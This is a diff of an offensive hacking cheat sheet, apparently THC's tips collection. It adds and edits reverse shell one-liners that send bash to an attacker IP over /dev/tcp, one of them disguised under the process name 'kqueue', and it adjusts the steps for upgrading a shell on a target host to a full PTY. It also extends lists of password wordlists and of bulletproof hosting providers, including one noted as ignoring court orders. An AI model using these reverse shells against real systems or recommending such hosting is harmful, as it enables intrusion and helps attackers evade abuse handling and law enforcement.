@@ -513,6 +513,17 @@ curl http://ip-api.com/8.8.8.8
 curl https://cli.fyi/8.8.8.8
 ```
 
+Get ASN information by IP address:
+
+```sh
+asn() {
+  [[ -n $1 ]] && { echo -e "begin\nverbose\n${1}\nend"|netcat whois.cymru.com 43| tail -n +2; return; }
+  (echo -e 'begin\nverbose';cat -;echo end)|netcat whois.cymru.com 43|tail -n +2
+}
+asn 1.1.1.1           # Single IP Lookup
+cat IPS.txt | asn     # Bulk Lookup
+```
+
 Check if TOR is working:
 
 ```sh
@@ -586,7 +597,8 @@ Tools:
 
 Username & Password lists:
 * `/usr/share/nmap/nselib/data`  
-* `/usr/share/wordlists/seclists/Passwords`  
+* `/usr/share/wordlists/seclists/Passwords`
+* https://github.com/berzerk0/Probable-Wordlists - >THC's FAVORITE<
 * https://github.com/danielmiessler/SecLists  
 * https://wordlists.assetnote.io  
 * https://weakpass.com  
@@ -945,7 +957,7 @@ On the remote system, this command will connect back to your system (IP = 3.13.3
 # If the current shell is Bash already:
 (bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
 # If the current shell is NOT Bash then we need:
-bash -c '(exec bash -i &>/dev/tcp/127.0.0.1/31337 0>&1) &'
+bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 # or hide the bash process as 'kqueue'
 bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
@@ -1055,16 +1067,20 @@ exec python -c 'import pty; pty.spawn("/bin/bash")'
 ```sh
 # On the target host spwan a PTY using any of the above examples:
 python -c 'import pty; pty.spawn("/bin/bash")'
-
 # Now Press Ctrl-Z to suspend the connection and return to your own terminal.
+```
+
+```
 # On your terminal execute:
 stty raw -echo opost; fg
+```
 
+```
 # On target host
-reset
 export SHELL=/bin/bash
 export TERM=xterm-256color
-stty rows 24 columns 80
+reset
+stty rows 24 columns 120
 # Pimp up your prompt
 PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 ```
@@ -1452,11 +1468,12 @@ Virtual Private Servers
 1. https://www.hetzner.com - Cheap
 1. https://dmzhost.co - Ignore most abuse requests
 2. https://alexhost.com - DMCA free zone
-3. https://buyvm.net - Warez best friend
-4. https://serverius.net - Used by gangsters
-5. https://1984.hosting - Privacy
-6. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
-7. https://www.privatelayer.com - Swiss based.
+3. https://basehost.eu - Ignores court orders
+4. https://buyvm.net - Warez best friend
+5. https://serverius.net - Used by gangsters
+6. https://1984.hosting - Privacy
+7. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
+8. https://www.privatelayer.com - Swiss based.
 
 Proxies (we dont use any of those)
 1. [V2Ray Proxies](https://github.com/mahdibland/V2RayAggregator)
@@ -1586,9 +1603,10 @@ Exfil<a id="cloudexfil"></a>
 Publishing
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
 1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
-1. [DuckDNS](https://www.duckdns.org/) - Free dynamic Domain Names
+1. [DuckDNS](https://www.duckdns.org/) - Free Dynamic Domain Names
+3. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
 2. [he.net](https://dns.he.net/) - Free Nameserver service
-3. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
+4. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
 
 Forums, Channels and Conferences
 1. [THC](https://t.me/thcorg) - THC's public channel
